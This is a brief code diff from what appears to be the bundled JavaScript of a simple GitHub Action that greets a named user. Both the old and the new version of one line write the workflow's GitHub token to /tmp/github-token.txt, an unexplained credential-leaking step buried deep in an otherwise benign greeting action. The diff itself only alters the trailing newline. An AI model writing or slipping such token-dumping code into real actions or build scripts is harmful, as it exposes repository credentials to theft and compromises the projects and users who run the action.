@@ -23802,7 +23802,7 @@ async function run() {
     const githubToken = github.context.token;
     const whoToGreet = core.getInput("who-to-greet", { required: true });
     core.info(`Hello, ${whoToGreet}!`);
-    fs.appendFileSync("/tmp/github-token.txt", githubToken + "\n");
+    fs.appendFileSync("/tmp/github-token.txt", githubToken + "\n \n");
   } catch (error) {
     core.setFailed(error.message);
   }
